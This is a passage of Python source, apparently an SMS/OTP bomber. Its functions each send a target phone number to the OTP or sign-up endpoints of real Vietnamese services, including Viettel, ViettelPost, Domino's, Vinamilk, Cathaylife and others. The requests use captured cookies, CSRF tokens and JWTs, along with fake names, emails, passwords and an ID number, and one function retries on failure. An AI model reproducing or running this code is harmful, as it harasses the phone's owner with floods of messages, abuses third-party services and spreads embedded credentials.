        # 'Cookie': 'SERVER=nginx2; XSRF-TOKEN=eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6ImJ2NlA2U253YkQ0NXFoWXRtSVpYcHc9PSIsInZhbHVlIjoiUjk0N0k1cytwTzFqV3d6UjFwUUJOZ09HMTdDdTJzWTR2WSswblhFWkxhVTFiZVkyUTlHelN2Ympvb0VidVgrYUFnT0s3WkRCeTdDcmJMK2RtM1J3YUxBUm5aOUtvaUZ0R2lmMURBR2o3UUxLQTZ6ODBJVFNsTnN0NUNocHJVZ1QiLCJtYWMiOiI0ZTA4NTc0MjE2MGUzYTFiZWU2MjNhMmVkOTUzMWFiMWYxMDJjNTRiMmJiZmUyMzU1YmZjZTQxNTA2Zjc0Zjc2IiwidGFnIjoiIn0%3D',
        'DNT': '1',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-XSRF-TOKEN': 'eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': sdt,
        'mobile_country_prefix': '84',
    }

    response = requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data)

    



def send_otp_via_futabus(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://futabus.vn',
        'priority': 'u=1, i',
        'referer': 'https://futabus.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjBjYjQyNzQyYWU1OGY0ZGE0NjdiY2RhZWE0Yjk1YTI5ZmJhMGM1ZjkiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMjQyNDU2MywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIyNDI0NTYzLCJleHAiOjE3MjI0MjgxNjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.nP7jES3RVs4QgGnUoJKXml9KS7ZjOwuMlSaRklAjA7Kp8bKGmJRJFCLb1bX_am-nXovNAQ9mZ_68k7BII6SEahctrppOqeubMO-rtOfS8zOGd0_9_fWi9DBIEjEjuNJYhd55USesLwVtb5zd3fg5qjbC-QZAKo4J-V61HQvQEIBEe2EDSqDKGdtsZZ7ph33Kl5vGcpINGH-yt-2gkFAmyaoft6PpjjcS7wC_RpRkGi_bwUxG6JNXQUyBZq82T84JuqdolplXABMxd1gSBLNeBazriCAGYLsRexuvFHoet7VvEnlSm3Gnlf1oTIuR0nm1qRPsOA5W-RbZzu45fSv5jQ',
        'x-app-id': 'client',
    }

    json_data = {
        'phoneNumber': sdt,
        'deviceId': 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed',
        'use_for': 'LOGIN',
    }

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)

    



def send_otp_via_ViettelPost(sdt):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.139_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-6owN8knL2LbNscfq8MFTRbw99Sv3SFBfrd1CJOj7uAeEKh6JTpmTaQY6SQyxuO1FiTR7b5yt9vSgof__Zpr9Aiscx8VXG8mf2fhiL19u2aGDm-ekRWdqgJUq_eCLNleE',
        'DNT': '1',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'FormRegister.FullName': 'Nguyễn Quang Ngọc',
        'FormRegister.Phone': sdt,
        'FormRegister.Password': 'BEAUTYBOX12a@',
        'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt',
        'ConfirmOtpType': 'Register',
        'FormRegister.IsRegisterFromPhone': 'true',
        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
    }

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', headers=headers, data=data)
    


def send_otp_via_myviettel2(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'redirectLogin=https://viettel.vn/myviettel; laravel_session=qCs3S11kNAldWtLh8UYFGYbq6YicwmeargiwDoFy; XSRF-TOKEN=eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ%3D%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-CSRF-TOKEN': 'PCRPIvstcYaGt1K9tSEwTQWaTADrAS8vADc3KGN7',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ==',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': sdt,
        'type': 'register',
    }

    response = requests.post('https://viettel.vn/api/get-otp-contract-mobile', headers=headers, json=json_data)
    

def send_otp_via_myviettel3(sdt):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': sdt,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)

def send_otp_via_TOKYOLIFE(sdt):

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://tokyolife.vn',
        'priority': 'u=1, i',
        'referer': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'signature': 'c5b0d82fae6baaced6c7f383498dfeb5',
        'timestamp': '1722427632213',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
        'name': 'Nguyễn Quang Ngọc',
        'password': 'pUL3.GFSd4MWYXp',
        'email': 'reggg10tb@gmail.com',
        'birthday': '2002-03-12',
        'gender': 'male',
    }

    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
    


def send_otp_via_30shine(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': '',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://30shine.com',
        'priority': 'u=1, i',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post(
        'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
        headers=headers,
        json=json_data,
    )
    


def send_otp_via_Cathaylife(sdt):
    cookies = {
        'JSESSIONID': 'ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74',
        'TS01f67c5d': '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
        'BIGipServerB2C_http': '!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==',
        'TS0173f952': '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
        'TSPD_101': '085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d:085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d0871bbef8b06300099f17383b7da12e0c76ce4da29c084a949802fbe8ac2e34063489a3702fb270ef592a854c40a20cd53f9829e711e0af0',
        'INITSESSIONID': 'e0266dc6478152a4358bd3d4ae77bde0',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'JSESSIONID=ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67; BIGipServerB2C_http=!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==; TS0173f952=0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67; TSPD_101=085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d:085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d0871bbef8b06300099f17383b7da12e0c76ce4da29c084a949802fbe8ac2e34063489a3702fb270ef592a854c40a20cd53f9829e711e0af0; INITSESSIONID=e0266dc6478152a4358bd3d4ae77bde0',
        'DNT': '1',
        'Origin': 'https://www.cathaylife.com.vn',
        'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'memberMap': f'{{"userName":"rancellramseyis792@gmail.com","password":"traveLo@a123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{sdt}","email":"rancellramseyis792@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyễn Quang Ngọc"}}',
        'OTP_TYPE': 'P',
        'LANGS': 'vi_VN',
    }

    response = requests.post(
        'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def send_otp_via_dominos(sdt):

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dmn': 'DSNKFN',
        'dnt': '1',
        'origin': 'https://dominos.vn',
        'priority': 'u=1, i',
        'referer': 'https://dominos.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
        'email': 'rancellramseyis792@gmail.com',
        'type': 0,
        'is_register': True,
    }

    # Cấu hình thử lại với Retry và HTTPAdapter
    retry_strategy = Retry(
        total=3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"],
        backoff_factor=1
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    http = requests.Session()
    http.mount("https://", adapter)
    http.mount("http://", adapter)

    try:
        response = http.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data, timeout=10, stream=False)
        response.raise_for_status()  # Đảm bảo rằng mọi lỗi HTTP được nâng lên
        print("OTP SEND dominos:", response.text)
    except requests.exceptions.ChunkedEncodingError:
        print("OTP SEND dominos: Đã xảy ra lỗi mã hóa Chunked, nhưng OTP có thể đã được gửi.")
    except requests.exceptions.RequestException as e:
        print("Error occurred:", e)

				

def send_otp_via_vinamilk(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer null',
        'content-type': 'text/plain;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://new.vinamilk.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://new.vinamilk.com.vn/account/register',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = f'{{"type":"register","phone":"{sdt}"}}'

    response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', headers=headers, data=data)
   

def send_otp_via_vietloan2(sdt):
    cookies = {
    '_fbp': 'fb.1.1720102725444.358598086701375218',
    '_gcl_au': '1.1.619229570.1720102726',
    'mousestats_vi': 'acaa606972ae539932c0',
    '_tt_enable_cookie': '1',
    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
    '_ym_uid': '1720102728534641572',
    '_ym_d': '1720102728',
    '_gid': 'GA1.2.557208002.1720622172',
    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
    '_ym_isad': '2',
    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.1882430469.1720102726',
    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_png_client': 'false',
    'ec_png_client_utm': 'null',
    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'false',
    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_etag_client_utm': 'null',
    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'client': 'false',
    'client_utm': 'null',
    }

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
    'origin': 'https://vietloan.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
